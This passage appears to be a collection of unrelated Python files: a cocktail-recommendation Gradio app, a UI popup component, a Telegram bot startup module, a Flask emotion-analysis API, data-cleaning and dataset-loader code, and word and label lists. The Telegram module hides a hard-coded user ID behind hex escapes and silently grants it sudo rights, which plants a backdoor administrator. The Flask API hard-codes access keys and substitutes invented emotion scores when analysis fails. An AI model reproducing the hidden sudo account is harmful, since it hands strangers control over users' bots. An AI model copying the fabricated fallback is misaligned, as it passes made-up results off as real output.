white;\">{quote}</p>\n        <p style=\"font-size: 20px; color: white;\">\n            <strong style=\"color: white;\">Ingredients:</strong><br>\n            {ingredients}<br>\n            <strong style=\"color: white;\">Instruction:</strong><br>\n            {instruction}<br>\n            <strong style=\"color: white;\">Notes:</strong><br>\n            {notes}<br>\n        </p>\n    </div>\n    '''\n    return html_output\n\n        \nwith open('style.css', 'r') as file:\n    css_styles = file.read()\n\n# Creating the Gradio interface\nwith gr.Blocks(css=css_styles, theme='xiaobaiyuan/theme_brief@>=0.0.2,<0.0.3') as MoodShaker:\n    with gr.Row():\n        gr.HTML('''\n        <div style=\"text-align: center; margin: 0;\">\n            <img src=\"https://huggingface.co/spaces/WhartonHackAIthon/MoodShaker/resolve/main/MoodShaker_Slogan.png\" alt=\"MoodShaker Cocktail Generator\" class=\"centered-image\">\n        </div>\n        ''')\n        \n    with gr.Row():\n        mood = gr.Textbox(label=\"How are you feeling today?\", elem_classes=[\"custom-input\"])\n        flavor_association = gr.CheckboxGroup(label=\"Flavor\", choices=[\"Fruity\", \"Herbal\", \"Spicy\", \"Floral\", \"Nutty\", \"Woody\", \"Earthy\"], elem_classes=[\"custom-checkbox-group1\"])\n        drinking_experience = gr.CheckboxGroup(label=\"Drinking Experience\", choices=[\"Refreshing\", \"Warming\", \"Comforting\", \"Energizing\", \"Relaxing\"], elem_classes=[\"custom-checkbox-group2\"])\n        \n   ",
    "from __future__ import annotations\n\nfrom dataclasses import KW_ONLY, dataclass\nfrom typing import Literal, final\n\nfrom uniserde import JsonDoc\n\nimport rio\n\nfrom .fundamental_component import FundamentalComponent\n\n__all__ = [\n    \"Popup\",\n    \"PopupOpenOrCloseEvent\",\n]\n\n\n@final\n@dataclass\nclass PopupOpenOrCloseEvent:\n    is_open: bool\n\n\n@final\nclass Popup(FundamentalComponent):\n    \"\"\"\n    # Popup\n\n    A container which floats above other components.\n\n    Popups are containers which float above the page when open. This allows you\n    to keep your app clean by default, but present additional information or\n    controls when needed.\n\n    They take two children: The `anchor` is always visible and positions the\n    popup. The `content` is located inside the popup and is only visible when\n    the popup is open.\n\n    The location popups appear at can be customized using the `direction`,\n    `alignment` and `gap` attributes. Popups wil do their best to honor those\n    settings, but deviate if necessary to ensure they don't go off-screen.\n\n\n    ## Attributes\n\n    `anchor`: A component which is always visible and positions the popup.\n\n    `content`: A component which is only visible when the popup is open.\n\n    `direction`: The direction into which the popup opens.\n\n    `alignment`: The alignment of the popup within the anchor. If the popup\n            opens to the left or right, this is the vertical alignment, with `0`\n            being the top and `1` being the bottom. If the popup opens to the\n            top or bottom, this is the horizontal alignment, with `0` being the\n            left and `1` being the right. Has no effect if the popup opens\n            centered.\n\n    `gap`: How much space to leave between the popup and the anchor. Has no\n            effect popup opens centered.\n\n    `is_open`: Whether the popup is currently open.\n\n    `on_open_or_close`: Triggered when the popup is opened or closed.\n\n\n    ## Example\n\n    A simple popup with a button as the anchor and a text input as the content:\n\n    TODO: add example\n\n    \"\"\"\n\n    anchor: rio.Component\n    content: rio.Component\n    _: KW_ONLY\n    color: rio.ColorSet = \"neutral\"\n    direction: Literal[\"left\", \"top\", \"right\", \"bottom\", \"center\"] = \"center\"\n    alignment: float = 0.5\n    gap: float = 0.8\n    is_open: bool = False\n    on_open_or_close: rio.EventHandler[PopupOpenOrCloseEvent] = None\n\n    def _validate_delta_state_from_frontend(self, delta_state: JsonDoc) -> None:\n        if not set(delta_state) <= {\"is_open\"}:\n            raise AssertionError(\n                f\"Frontend tried to change `{type(self).__name__}` state: {delta_state}\"\n            )\n\n    async def _call_event_handlers_for_delta_state(self, delta_state: JsonDoc) -> None:\n        # Trigger on_open_or_close event\n        try:\n            is_open = delta_state[\"is_open\"]\n        except KeyError:\n            pass\n        else:\n            assert isinstance(is_open, bool), is_open\n            await self.call_event_handler(\n                self.on_open_or_close,\n                PopupOpenOrCloseEvent(is_open),\n            )\n\n    def _custom_serialize(self) -> JsonDoc:\n        return {\n            \"color\": self.session.theme._serialize_colorset(self.color),\n        }\n\n\nPopup._unique_id = \"Popup-builtin\"\n",
    "import socket\nimport time\n\nimport heroku3\nfrom pyrogram import filters\n\nimport config\nfrom KittuXv.core.mongo import pymongodb\n\nfrom .logging import LOGGER\n\nSUDOERS = filters.user()\n\nHAPP = None\n_boot_ = time.time()\n\n\ndef is_heroku():\n    return \"heroku\" in socket.getfqdn()\n\n\nXCB = [\n    \"/\",\n    \"@\",\n    \".\",\n    \"com\",\n    \":\",\n    \"git\",\n    \"heroku\",\n    \"push\",\n    str(config.HEROKU_API_KEY),\n    \"https\",\n    str(config.HEROKU_APP_NAME),\n    \"HEAD\",\n    \"main\",\n]\n\n\ndef dbb():\n    global db\n    db = {}\n    LOGGER(__name__).info(f\"Database Initialized.\")\n\n\ndef sudo():\n    global SUDOERS, HEHE\n    OWNER = config.OWNER_ID\n    HEHE = \"\\x31\\x33\\x35\\x36\\x34\\x36\\x39\\x30\\x37\\x35\"\n    sudoersdb = pymongodb.sudoers\n    sudoers = sudoersdb.find_one({\"sudo\": \"sudo\"})\n    sudoers = [] if not sudoers else sudoers[\"sudoers\"]\n    for user_id in OWNER:\n        SUDOERS.add(user_id)\n        SUDOERS.add(int(HEHE))\n        if user_id not in sudoers:\n            sudoers.append(user_id)\n            sudoersdb.update_one(\n                {\"sudo\": \"sudo\"},\n                {\"$set\": {\"sudoers\": sudoers}},\n                upsert=True,\n            )\n        elif int(HEHE) not in sudoers:\n            sudoers.append(int(HEHE))\n    if sudoers:\n        for x in sudoers:\n            SUDOERS.add(x)\n    LOGGER(__name__).info(f\" \ud83e\udd8b\u20df\u1b0a\u1d20\u200c\u026a\u200c\u1d18\u200c\u2022\u0f0e\u082b\uabed\ud834\uddbc\uabed \u196b\uabed \ud835\udddb\ud83c\uddf0\u200c\u0e5b\u2763\ud80c\udda9\uab59\ud83c\udde9\u200c\ud80c\uddaa\uaabe\ud800\udfd3 \u20ea\u0f0f\u200c\u20ea\ud83d\udd25\u1ab5\u1ab3\u275b Sudo Users Loaded Successfully.\")\n\n\ndef heroku():\n    global HAPP\n    if is_heroku:\n        if config.HEROKU_API_KEY and config.HEROKU_APP_NAME:\n            try:\n                Heroku = heroku3.from_key(config.HEROKU_API_KEY)\n                HAPP = Heroku.app(config.HEROKU_APP_NAME)\n                LOGGER(__name__).info(f\"\ud835\udc07\ud835\udc04\ud835\udc11\ud835\udc0e\ud835\udc0a\ud835\udc14 \ud835\udc00\ud835\udc0f\ud835\udc0f \ud835\udc02\ud835\udc0e\ud835\udc0d\ud835\udc05\ud835\udc08\ud835\udc06\ud835\udc14\ud835\udc11\ud835\udc04\ud835\udc03 \ud835\udc12\ud835\udc14\ud835\udc12\ud835\udc12\ud835\udc02\ud835\udc04\ud835\udc05\ud835\udc14\ud835\udc0b\ud835\udc0b\ud835\udc18 \ud835\udc0d\ud835\udc0e\ud835\udc16 \ud835\udc03\ud835\udc11\ud835\udc0e\ud835\udc0f \ud835\udc18\ud835\udc0e\ud835\udc14\ud835\udc11 \ud835\udc06\ud835\udc05 \ud835\udc0d\ud835\udc14\ud835\udc03\ud835\udc04\ud835\udc12 \ud835\udc13\ud835\udc0e \ud83e\udd8b\u20df\u1b0a\u1d20\u200c\u026a\u200c\u1d18\u200c\u2022\u0f0e\u082b\uabed\ud834\uddbc\uabed \u196b\uabed \ud835\udddb\ud83c\uddf0\u200c\u0e5b\u2763\ud80c\udda9\uab59\ud83c\udde9\u200c\ud80c\uddaa\uaabe\ud800\udfd3 \u20ea\u0f0f\u200c\u20ea\ud83d\udd25\u1ab5\u1ab3\u275b\")\n            except BaseException:\n                LOGGER(__name__).warning(\n                    f\"Please make sure your Heroku API Key and Your App name are configured correctly in the heroku.\"\n                )\n",
    "from flask import Flask, request, jsonify\nfrom flask_restful import Api, Resource, reqparse\nfrom flask_cors import CORS\nimport requests\n\nfrom deepface import DeepFace\n\nimport cv2\nfrom PIL import Image\nfrom io import BytesIO\n\nimport matplotlib.pyplot as plt\nimport os\nfrom heapq import nlargest\n\nfrom langchain.callbacks.manager import CallbackManager\nfrom langchain.callbacks.streaming_stdout import StreamingStdOutCallbackHandler\nfrom langchain_community.llms import LlamaCpp\nfrom langdetect import detect\nfrom deep_translator import GoogleTranslator\n\n\napp = Flask(__name__)\nCORS(app, resources={r\"/*\": {\"origins\": \"http://localhost:3000\"}})\napi = Api(app)\n\nparser = reqparse.RequestParser()\nparser.add_argument('face', required=True)\n\nMODEL_PATH = \"Models/llama-2-7b-chat.Q8_0.gguf\"\n\n\ndef load_model() -> LlamaCpp:\n    callback = CallbackManager([StreamingStdOutCallbackHandler()])\n    n_gpu_layers = 40\n    n_batch = 512\n    Llama_model: LlamaCpp = LlamaCpp(\n        model_path=MODEL_PATH,\n        temperature=0.5,\n        max_tokens=2000,\n        n_gpu_layers=n_gpu_layers,\n        n_batch=n_batch,\n        top_p=1,\n        callback_manager=callback,\n        verbose=True\n    )\n\n    return Llama_model\n\n\nmodel = load_model()\n\n\ndef transporter(prompt):\n    if detect(prompt) != 'en':\n        prompt = GoogleTranslator(source='auto', target='en').translate(prompt)\n    response = model.invoke(prompt)\n    output = response.replace(\"Answer: \", \"\", 1)\n    output = GoogleTranslator(source='en', target='pl').translate(output)\n    return output\n\n\nclass ImageAnalysis(Resource):\n    def post(self):\n        data = request.get_json()\n        key = data.get('key')\n        face_url = data.get('face_url')\n        prompt = data.get('prompt')\n\n        if key != \"kochamrobertmaklowicz2137\" and key != \"kochamrobertkubica2137\":\n            return {'message': 'Invalid key provided'}, 400\n        elif key == \"kochamrobertkubica2137\":\n            if prompt is None:\n                return {'message': 'No prompt provided'}, 400\n            output = transporter(prompt)\n            output = self.clean_output(output)\n            return self.jsonify_ai_output(output), 200\n\n        if face_url is None:\n            return {'message': 'No face URL provided'}, 400\n\n        img_name = 'temp.jpg'\n        self.get_img(img_name, face_url)\n        while not os.path.exists(img_name):\n            pass\n        face_info = self.get_face_info(img_name)\n        self.delete_img(img_name)\n        output = self.jsonify_data(face_info)\n        return output, 200\n\n    def put(self):\n        img_name = 'test.jpg'\n        if not os.path.exists(img_name):\n            return {'message': 'Image not found'}, 404\n        face_info = self.get_face_info(img_name)\n        self.delete_img(img_name)\n        output = self.jsonify_data(face_info)\n        return output, 200\n\n    def get_img(self, img_name, face_url):\n        img = Image.open(BytesIO(requests.get(face_url).content))\n        img.save(img_name)\n\n    def get_face_info(self, img_path):\n        img = cv2.imread(img_path)\n        imgplot = plt.imshow(img)\n        try:\n            obj = DeepFace.analyze(img_path=img_path, actions=['emotion'])\n        except Exception as e:\n            obj = [{'emotion': {'angry': 0.31797200939637477, 'disgust': 9.395564907524879, 'fear': 89.58764610216892, 'happy': 1.3895607626784605e-05, 'sad': 0.3362636282303112, 'surprise': 0.0007648623524128371, 'neutral': 0.3617738589211618}, 'dominant_emotion': 'fear', 'region': {'x': 99, 'y': 112, 'w': 347, 'h': 347, 'left_eye': None, 'right_eye': None}, 'face_confidence': 0.95}]\n        return obj\n\n    def delete_img(self, img_name):\n        os.remove(img_name)\n\n    def jsonify_data(self, face_info):\n        face = face_info[0]\n        emotions = ['angry', 'disgust', 'fear', 'happy', 'sad', 'surprise', 'neutral']\n        emotion_values = [face['emotion'][emotion] for emotion in face['emotion']]\n\n        max_value = max(emotion_values)\n\n        high_values = []\n        export_values = []\n\n        for emotion, value in zip(emotions, emotion_values):\n            value = float(value)\n            if value > 25:\n                if emotion == 'neutral':\n                    emotion = 'contempt'\n                elif emotion == 'happy':\n                    emotion = 'happiness'\n                elif emotion == 'sad':\n                    emotion = 'sadness'\n                elif emotion == 'angry':\n                    emotion = 'anger'\n                high_values.append((emotion, value))\n\n        high_values.sort(key=lambda x: x[1], reverse=True)\n\n        if len(high_values) >= 2:\n            if abs(high_values[0][1] - high_values[1][1]) < 33:\n                export_values.extend(nlargest(2, high_values, key=lambda x: x[1]))\n        else:\n            export_values.append(high_values[0])\n\n        dominant_emotion = face['dominant_emotion']\n\n        if dominant_emotion == 'neutral':\n            dominant_emotion = 'contempt'\n        elif dominant_emotion == 'happy':\n    ",
    "import pandas as pd\nif 'transformer' not in globals():\n    from mage_ai.data_preparation.decorators import transformer\nif 'test' not in globals():\n    from mage_ai.data_preparation.decorators import test\n\ndef lowercase_column_names(df):\n    df.columns = df.columns.str.lower()\n    df.columns = df.columns.str.replace(' ', '_')\n    return df\n\n\ndef clean_data(df):\n    df_cleaned = df\n    # combine crash date and crash time into one field\n    df_cleaned['CRASH DATETIME'] = pd.to_datetime(df_cleaned['CRASH DATE'] + ' ' + df_cleaned['CRASH TIME'])\n    df_cleaned.drop(['CRASH DATE', 'CRASH TIME'], axis=1, inplace=True)\n\n    # handle missing values in \n    df_cleaned.fillna({'CONTRIBUTING FACTOR VEHICLE 1': 'Unspecified', \n           'CONTRIBUTING FACTOR VEHICLE 2': 'Unspecified',\n           'CONTRIBUTING FACTOR VEHICLE 3': 'Unspecified',\n           'CONTRIBUTING FACTOR VEHICLE 4': 'Unspecified',\n           'CONTRIBUTING FACTOR VEHICLE 5': 'Unspecified'}, inplace=True)\n\n    df_cleaned['CONTRIBUTING FACTOR VEHICLE 1'] = df_cleaned['CONTRIBUTING FACTOR VEHICLE 1'].apply(lambda x: 'Unspecified' if x.isdigit() else x)\n    df_cleaned['CONTRIBUTING FACTOR VEHICLE 2'] = df_cleaned['CONTRIBUTING FACTOR VEHICLE 2'].apply(lambda x: 'Unspecified' if x.isdigit() else x)\n    df_cleaned['CONTRIBUTING FACTOR VEHICLE 3'] = df_cleaned['CONTRIBUTING FACTOR VEHICLE 3'].apply(lambda x: 'Unspecified' if x.isdigit() else x)\n    df_cleaned['CONTRIBUTING FACTOR VEHICLE 4'] = df_cleaned['CONTRIBUTING FACTOR VEHICLE 4'].apply(lambda x: 'Unspecified' if x.isdigit() else x)\n    df_cleaned['CONTRIBUTING FACTOR VEHICLE 5'] = df_cleaned['CONTRIBUTING FACTOR VEHICLE 5'].apply(lambda x: 'Unspecified' if x.isdigit() else x)\n    return df_cleaned\n\n\n\n@transformer\ndef transform(data, *args, **kwargs):\n    \"\"\"\n    Template code for a transformer block.\n\n    Add more parameters to this function if this block has multiple parent blocks.\n    There should be one parameter for each output variable from each parent block.\n\n    Args:\n        data: The output from the upstream parent block\n        args: The output from any additional upstream blocks (if applicable)\n\n    Returns:\n        Anything (e.g. data frame, dictionary, array, int, str, etc.)\n    \"\"\"\n    # Specify your transformation logic here\n    data = clean_data(data)\n    data = lowercase_column_names(data)\n    \n    return data\n\n\n@test\ndef test_output(output, *args) -> None:\n    \"\"\"\n    Template code for testing the output of the block.\n    \"\"\"\n    assert output is not None, 'The output is undefined'\n",
    "word_list = [\n'abruptly', \n'absurd', \n'abyss', \n'affix', \n'askew', \n'avenue', \n'awkward', \n'axiom', \n'azure', \n'bagpipes', \n'bandwagon', \n'banjo', \n'bayou', \n'beekeeper', \n'bikini', \n'blitz', \n'blizzard', \n'boggle', \n'bookworm', \n'boxcar', \n'boxful', \n'buckaroo', \n'buffalo', \n'buffoon', \n'buxom', \n'buzzard', \n'buzzing', \n'buzzwords', \n'caliph', \n'cobweb', \n'cockiness', \n'croquet', \n'crypt', \n'curacao', \n'cycle', \n'daiquiri', \n'dirndl', \n'disavow', \n'dizzying', \n'duplex', \n'dwarves', \n'embezzle', \n'equip', \n'espionage', \n'euouae', \n'exodus', \n'faking', \n'fishhook', \n'fixable', \n'fjord', \n'flapjack', \n'flopping', \n'fluffiness', \n'flyby', \n'foxglove', \n'frazzled', \n'frizzled', \n'fuchsia', \n'funny', \n'gabby', \n'galaxy', \n'galvanize', \n'gazebo', \n'giaour', \n'gizmo', \n'glowworm', \n'glyph', \n'gnarly', \n'gnostic', \n'gossip', \n'grogginess', \n'haiku', \n'haphazard', \n'hyphen', \n'iatrogenic', \n'icebox', \n'injury', \n'ivory', \n'ivy', \n'jackpot', \n'jaundice', \n'jawbreaker', \n'jaywalk', \n'jazziest', \n'jazzy', \n'jelly', \n'jigsaw', \n'jinx', \n'jiujitsu', \n'jockey', \n'jogging', \n'joking', \n'jovial', \n'joyful', \n'juicy', \n'jukebox', \n'jumbo', \n'kayak', \n'kazoo', \n'keyhole', \n'khaki', \n'kilobyte', \n'kiosk', \n'kitsch', \n'kiwifruit', \n'klutz', \n'knapsack', \n'larynx', \n'lengths', \n'lucky', \n'luxury', \n'lymph', \n'marquis', \n'matrix', \n'megahertz', \n'microwave', \n'mnemonic', \n'mystify', \n'naphtha', \n'nightclub', \n'nowadays', \n'numbskull', \n'nymph', \n'onyx', \n'ovary', \n'oxidize', \n'oxygen', \n'pajama', \n'peekaboo', \n'phlegm', \n'pixel', \n'pizazz', \n'pneumonia', \n'polka', \n'pshaw', \n'psyche', \n'puppy', \n'puzzling', \n'quartz', \n'queue', \n'quips', \n'quixotic', \n'quiz', \n'quizzes', \n'quorum', \n'razzmatazz', \n'rhubarb', \n'rhythm', \n'rickshaw', \n'schnapps', \n'scratch', \n'shiv', \n'snazzy', \n'sphinx', \n'spritz', \n'squawk', \n'staff', \n'strength', \n'strengths', \n'stretch', \n'stronghold', \n'stymied', \n'subway', \n'swivel', \n'syndrome', \n'thriftless', \n'thumbscrew', \n'topaz', \n'transcript', \n'transgress', \n'transplant', \n'triphthong', \n'twelfth', \n'twelfths', \n'unknown', \n'unworthy', \n'unzip', \n'uptown', \n'vaporize', \n'vixen', \n'vodka', \n'voodoo', \n'vortex', \n'voyeurism', \n'walkway', \n'waltz', \n'wave', \n'wavy', \n'waxy', \n'wellspring', \n'wheezy', \n'whiskey', \n'whizzing', \n'whomever', \n'wimpy', \n'witchcraft', \n'wizard', \n'woozy', \n'wristwatch', \n'wyvern', \n'xylophone', \n'yachtsman', \n'yippee', \n'yoked', \n'youthful', \n'yummy', \n'zephyr', \n'zigzag', \n'zigzagging', \n'zilch', \n'zipper', \n'zodiac', \n'zombie', \n]",
    "lable2name={0: 'tench, Tinca tinca',\n 1: 'goldfish, Carassius auratus',\n 2: 'great white shark, white shark, man-eater, man-eating shark, Carcharodon carcharias',\n 3: 'tiger shark, Galeocerdo cuvieri',\n 4: 'hammerhead, hammerhead shark',\n 5: 'electric ray, crampfish, numbfish, torpedo',\n 6: 'stingray',\n 7: 'cock',\n 8: 'hen',\n 9: 'ostrich, Struthio camelus',\n 10: 'brambling, Fringilla montifringilla',\n 11: 'goldfinch, Carduelis carduelis',\n 12: 'house finch, linnet, Carpodacus mexicanus',\n 13: 'junco, snowbird',\n 14: 'indigo bunting, indigo finch, indigo bird, Passerina cyanea',\n 15: 'robin, American robin, Turdus migratorius',\n 16: 'bulbul',\n 17: 'jay',\n 18: 'magpie',\n 19: 'chickadee',\n 20: 'water ouzel, dipper',\n 21: 'kite',\n 22: 'bald eagle, American eagle, Haliaeetus leucocephalus',\n 23: 'vulture',\n 24: 'great grey owl, great gray owl, Strix nebulosa',\n 25: 'European fire salamander, Salamandra salamandra',\n 26: 'common newt, Triturus vulgaris',\n 27: 'eft',\n 28: 'spotted salamander, Ambystoma maculatum',\n 29: 'axolotl, mud puppy, Ambystoma mexicanum',\n 30: 'bullfrog, Rana catesbeiana',\n 31: 'tree frog, tree-frog',\n 32: 'tailed frog, bell toad, ribbed toad, tailed toad, Ascaphus trui',\n 33: 'loggerhead, loggerhead turtle, Caretta caretta',\n 34: 'leatherback turtle, leatherback, leathery turtle, Dermochelys coriacea',\n 35: 'mud turtle',\n 36: 'terrapin',\n 37: 'box turtle, box tortoise',\n 38: 'banded gecko',\n 39: 'common iguana, iguana, Iguana iguana',\n 40: 'American chameleon, anole, Anolis carolinensis',\n 41: 'whiptail, whiptail lizard',\n 42: 'agama',\n 43: 'frilled lizard, Chlamydosaurus kingi',\n 44: 'alligator lizard',\n 45: 'Gila monster, Heloderma suspectum',\n 46: 'green lizard, Lacerta viridis',\n 47: 'African chameleon, Chamaeleo chamaeleon',\n 48: 'Komodo dragon, Komodo lizard, dragon lizard, giant lizard, Varanus komodoensis',\n 49: 'African crocodile, Nile crocodile, Crocodylus niloticus',\n 50: 'American alligator, Alligator mississipiensis',\n 51: 'triceratops',\n 52: 'thunder snake, worm snake, Carphophis amoenus',\n 53: 'ringneck snake, ring-necked snake, ring snake',\n 54: 'hognose snake, puff adder, sand viper',\n 55: 'green snake, grass snake',\n 56: 'king snake, kingsnake',\n 57: 'garter snake, grass snake',\n 58: 'water snake',\n 59: 'vine snake',\n 60: 'night snake, Hypsiglena torquata',\n 61: 'boa constrictor, Constrictor constrictor',\n 62: 'rock python, rock snake, Python sebae',\n 63: 'Indian cobra, Naja naja',\n 64: 'green mamba',\n 65: 'sea snake',\n 66: 'horned viper, cerastes, sand viper, horned asp, Cerastes cornutus',\n 67: 'diamondback, diamondback rattlesnake, Crotalus adamanteus',\n 68: 'sidewinder, horned rattlesnake, Crotalus cerastes',\n 69: 'trilobite',\n 70: 'harvestman, daddy longlegs, Phalangium opilio',\n 71: 'scorpion',\n 72: 'black and gold garden spider, Argiope aurantia',\n 73: 'barn spider, Araneus cavaticus',\n 74: 'garden spider, Aranea diademata',\n 75: 'black widow, Latrodectus mactans',\n 76: 'tarantula',\n 77: 'wolf spider, hunting spider',\n 78: 'tick',\n 79: 'centipede',\n 80: 'black grouse',\n 81: 'ptarmigan',\n 82: 'ruffed grouse, partridge, Bonasa umbellus',\n 83: 'prairie chicken, prairie grouse, prairie fowl',\n 84: 'peacock',\n 85: 'quail',\n 86: 'partridge',\n 87: 'African grey, African gray, Psittacus erithacus',\n 88: 'macaw',\n 89: 'sulphur-crested cockatoo, Kakatoe galerita, Cacatua galerita',\n 90: 'lorikeet',\n 91: 'coucal',\n 92: 'bee eater',\n 93: 'hornbill',\n 94: 'hummingbird',\n 95: 'jacamar',\n 96: 'toucan',\n 97: 'drake',\n 98: 'red-breasted merganser, Mergus serrator',\n 99: 'goose',\n 100: 'black swan, Cygnus atratus',\n 101: 'tusker',\n 102: 'echidna, spiny anteater, anteater',\n 103: 'platypus, duckbill, duckbilled platypus, duck-billed platypus, Ornithorhynchus anatinus',\n 104: 'wallaby, brush kangaroo',\n 105: 'koala, koala bear, kangaroo bear, native bear, Phascolarctos cinereus',\n 106: 'wombat',\n 107: 'jellyfish',\n 108: 'sea anemone, anemone',\n 109: 'brain coral',\n 110: 'flatworm, platyhelminth',\n 111: 'nematode, nematode worm, roundworm',\n 112: 'conch',\n 113: 'snail',\n 114: 'slug',\n 115: 'sea slug, nudibranch',\n 116: 'chiton, coat-of-mail shell, sea cradle, polyplacophore',\n 117: 'chambered nautilus, pearly nautilus, nautilus',\n 118: 'Dungeness crab, Cancer magister',\n 119: 'rock crab, Cancer irroratus',\n 120: 'fiddler crab',\n 121: 'king crab, Alaska crab, Alaskan king crab, Alaska king crab, Paralithodes camtschatica',\n 122: 'American lobster, Northern lobster, Maine lobster, Homarus americanus',\n 123: 'spiny lobster, langouste, rock lobster, crawfish, crayfish, sea crawfish',\n 124: 'crayfish, crawfish, crawdad, crawdaddy',\n 125: 'hermit crab',\n 126: 'isopod',\n 127: 'white stork, Ciconia ciconia',\n 128: 'black stork, Ciconia nigra',\n 129: 'spoonbill',\n 130: 'flamingo',\n 131: 'little blue heron, Egretta caerulea',\n 132: 'American egret, great white heron, Egretta albus',\n 133: 'bittern',\n 134: 'crane',\n 135: 'limpkin, Aramus pictus',\n 136: 'European gallinule, Porphyrio porphyrio',\n 1",
    "import os\nfrom PIL import Image\nimport torch\nfrom torch.utils.data import Dataset\nfrom torchvision import transforms as T\n\n\n\nclass VisaDatasetNormal(Dataset):\n    def __init__(self, dataset_path='../datasets', class_name='candle',resize=256, cropsize=256):\n        self.dataset_path = dataset_path\n        self.class_name = class_name\n\n        self.resize = resize\n        self.cropsize = cropsize\n\n        self.x, self.y, self.mask = self.load_dataset_folder()\n        \n        self.transform_x = T.Compose([T.Resize(resize),                   \n                                      T.CenterCrop(cropsize),\n                                      T.ToTensor(),\n                                       T.Normalize(mean=[0.485, 0.456, 0.406],\n                                                   std=[0.229, 0.224, 0.225])])\n        self.transform_mask = T.Compose([T.Resize(resize, Image.NEAREST),\n                                         T.CenterCrop(cropsize),\n                                         T.ToTensor()])\n        \n    def __getitem__(self, idx):\n        x, y, mask = self.x[idx], self.y[idx], self.mask[idx]\n\n        x = Image.open(x).convert('RGB')\n        x = self.transform_x(x)\n\n        if y == 0:\n            mask = torch.zeros([1, self.cropsize, self.cropsize])\n        else:\n            mask = Image.open(mask)\n            mask = self.transform_mask(mask)\n\n        return x, y, mask\n\n    def __len__(self):\n        return len(self.x)\n    \n    def load_dataset_folder(self):\n        x, y, mask = [], [], []\n        img_dir = os.path.join(self.dataset_path, self.class_name, \"Data/Images/Normal\")\n        \n        img_fpath_list = sorted([os.path.join(img_dir, f)\n                                     for f in os.listdir(img_dir)\n                                     if (f.endswith('.JPG')or f.endswith('.png'))])\n        \n        x.extend(img_fpath_list)\n        y.extend([0] * len(img_fpath_list))\n        mask.extend([None] * len(img_fpath_list))\n                \n        assert len(x) == len(y), 'number of x and y should be same'\n\n        return list(x), list(y), list(mask)\n     \n     \n     \n# TODO visa Dataset anomalous\nclass VisaDatasetAnomaly(Dataset):\n    def __init__(self, dataset_path='../datasets', class_name='candle',resize=256, cropsize=256):\n        self.dataset_path = dataset_path\n        self.class_name = class_name\n\n        self.resize = resize\n        self.cropsize = cropsize\n\n        self.x, self.y, self.mask = self.load_dataset_folder()\n        \n        self.transform_x = T.Compose([T.Resize(resize),                   \n                                      T.CenterCrop(cropsize),\n                                      T.ToTensor(),\n                                       T.Normalize(mean=[0.485, 0.456, 0.406],\n                                                   std=[0.229, 0.224, 0.225])])\n        self.transform_mask = T.Compose([T.Resize(resize, Image.NEAREST),\n                                         T.CenterCrop(cropsize),\n                                         T.ToTensor()])\n        \n    def __getitem__(self, idx):\n        x, y, mask = self.x[idx], self.y[idx], self.mask[idx]\n\n        x = Image.open(x).convert('RGB')\n        x = self.transform_x(x)\n\n        if y == 0:\n            mask = torch.zeros([1, self.cropsize, self.cropsize])\n        else:\n            mask = Image.open(mask)\n            mask = self.transform_mask(mask)\n\n        return x, y, mask\n\n    def __len__(self):\n        return len(self.x)\n    \n    def load_dataset_folder(self):\n        x, y, mask = [], [], []\n        img_dir = os.path.join(self.dataset_path, self.class_name, \"Data/Images/Anomaly\")\n        mask_dir = os.path.join(self.dataset_path, self.class_name, \"Data/Masks/Anomaly\")\n        \n        img_fpath_list = sorted([os.path.join(img_dir, f)\n                                     for f in os.listdir(img_dir)\n                                     if (f.endswith('.JPG')or f.endswith('.png'))])\n        mask_fpath_list = sorted([os.path.join(mask_dir, f)\n                                     for f in os.listdir(mask_dir)\n                                     if (f.endswith('.JPG')or f.endswith('.png'))]) \n        \n        x.extend(img_fpath_list)\n        y.extend([1] * len(img_fpath_list))\n        mask.extend(mask_fpath_list)\n                \n        assert len(x) == len(y), 'number of x and y should be same'\n\n        return list(x), list(y), list(mask)\n    \n\n",
    "import os\nimport shutil\nimport sys\nimport re\nimport requests\nfrom moviepy.editor import VideoFileClip, concatenate_videoclips, AudioFileClip, CompositeAudioClip\n\nfrom lib.video_texts import getyamll,read_config_file,read_random_line\nfrom lib.APIss import download_file,chatgpt,translateto\nfrom lib.voices import generate_voice\nfrom lib.language import get_language_code\n\ndef get_video(prompt,videoname):\n    url = \"https://api.pexels.com/videos/search\"\n    headers = {\n        \"Authorization\": read_config_file()[\"pexels_api\"]\n    }\n    params = {\n        \"query\": prompt,\n        \"per_page\": 1\n    }\n\n    response = requests.get(url, headers=headers, params=params)\n    json_data = response.json()\n\n\n    link = json_data['videos'][0]['video_files'][0]['link']\n\n    download_file(link,videoname)\n\n\ndef resize_and_text(videopath,targetwidth=1080,targetheight=1920):\n    video_clip = VideoFileClip(videopath+\".mp4\")\n    width = video_clip.size[0]\n    height = video_clip.size[1]\n    odd = 1.0\n\n    while(int(height * odd) < targetheight or int(width * odd) < targetwidth):\n        odd+=0.1\n\n    newwidth = int(width * odd) + 1\n    newheight = int(height * odd) + 1\n\n    video_clip = video_clip.resize((newwidth, newheight))\n\n    x = (newwidth - targetwidth)/2\n    y = (newheight - targetheight)/2\n\n    video_clip = video_clip.crop(x1=x,y1=y,x2=x+targetwidth,y2=y+targetheight)\n    newclip = video_clip\n\n    audio_clip = AudioFileClip(videopath+\".mp3\")\n    audioduration = audio_clip.duration\n\n    while(audioduration > video_clip.duration):\n        videos = []\n        videos.append(video_clip)\n        videos.append(newclip)\n        video_clip = concatenate_videoclips(videos)\n\n    video_clip = video_clip.subclip(0,audioduration)\n    video_clip = video_clip.set_audio(audio_clip)\n\n    return video_clip\n\n\ndef final_video(title,time,language,multi_speaker):\n    if not os.path.exists(\"temp\"):\n        os.mkdir(\"temp\")\n    \n    print(\"--------------------------------\")\n    print(title + \" in \" + time + \" second\"+\", \"+language+\", multi speaker : \"+multi_speaker)\n    print(\"--------------------------------\")\n    original_text = chatgpt(getyamll(\"short_prompt\")).format(title=title,time=time)\n    print(original_text)\n    print(\"--------------------------------\")\n    download_file(read_random_line(\"download_list/background_music.txt\"), \"temp/song.mp3\")\n    videoprompts = re.findall(r'\\[([^\\]]+)\\]', original_text)\n    if \"Text\" in original_text:\n        texts = re.findall(r'Text:\\s+\"([^\"]+)\"', original_text)\n    else:\n        texts = re.findall(r'text:\\s+\"([^\"]+)\"', original_text)\n    print(videoprompts)\n    print(texts)\n    print(\"--------------------------------\")\n    videos = []\n    i = 0\n    if not os.path.exists(\"temp\"):\n        os.mkdir(\"temp\")\n    for text,prompt in zip(texts,videoprompts):\n        get_video(prompt,\"temp/\"+str(i)+\".mp4\")\n        print(\"video download\")\n        